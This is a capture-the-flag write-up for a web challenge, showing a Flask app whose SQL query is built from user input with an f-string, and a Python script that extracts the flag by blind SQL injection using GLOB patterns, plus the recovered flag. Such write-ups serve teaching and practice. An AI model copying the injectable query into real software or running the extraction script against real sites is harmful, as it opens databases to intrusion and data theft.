# lottery

[library.m0unt41n.ch/challenges/lottery](https://library.m0unt41n.ch/challenges/lottery) ![](../../resources/web.svg) ![](../../resources/easy.svg) 

# TL;DR

We get a link to a site where we can guess numbers - with a source
and a `Dockerfile`

# Code

A very simple Flask app:

```python
import os, sqlite3
from flask import Flask, render_template, request

db = sqlite3.connect(":memory:", check_same_thread=False)
cur = db.cursor()
cur.execute("""
CREATE TABLE answers (answer TEXT NOT NULL);
""")
cur.execute("INSERT INTO answers VALUES ('ananas');")
cur.execute("INSERT INTO answers VALUES ('" + os.environ.get("FLAG", "flag{fake_flag}") + "');")
cur.execute("INSERT INTO answers VALUES ('banana');")

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    has_guessed = False
    answer_correct = False
    if request.method == "POST":
        has_guessed = True
        guess = request.form.get("guess", "")
        cur.execute(f"SELECT * FROM answers WHERE answer = '{guess}'")
        rows = cur.fetchall()
        answer_correct = len(rows) > 0
    return render_template("index.html", has_guessed=has_guessed, answer_correct=answer_correct)

app.run(host="0.0.0.0", port=5000)
```

# Analysis

Key observation: the `guess` param of the POST request allows SQL injection.
We can't extract any actual information from the webapp, but the description hints
that we have unlimited attempts, so, we can try decoding every character
individually.

First instinct is to inject something like: `xxxxxx' OR answer LIKE 'cyberskills23{_`
... where `_` is replaced with arbitrary characters until the app returns
`Correct`. That gets us a flag: `cyberskills23{y0u_ju5t_h4v3_t0_g3t_lucky_335e69bce0a1}` -
but it is not correct!

Next observation is that `LIKE` is case-insensitive, so, we might have
better results with `GLOB And that works:

## Getting the flag

```python
import requests
import sys

URL = "https://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch:1337"
flag = "cyberskills23"

# The charset excludes: * ? (GLOB special chars) and " ' \  (just in case)
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!#$%&()+,-./:;<=>@[]^`|~"

found = True
while found:
    found = False
    for c in CHARSET:
        params = {"guess": "xxxxxx' OR answer GLOB '"+flag+c+"*"}
        html = requests.post(URL, data=params).text
        if "Your guess is correct, congrats!" in html:
           flag = flag+c
           found = True
           print(flag)
           break
```

---

## `cyberskills23{Y0u_ju5t_h4v3_t0_g3t_lucky_335e69bce0a1}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
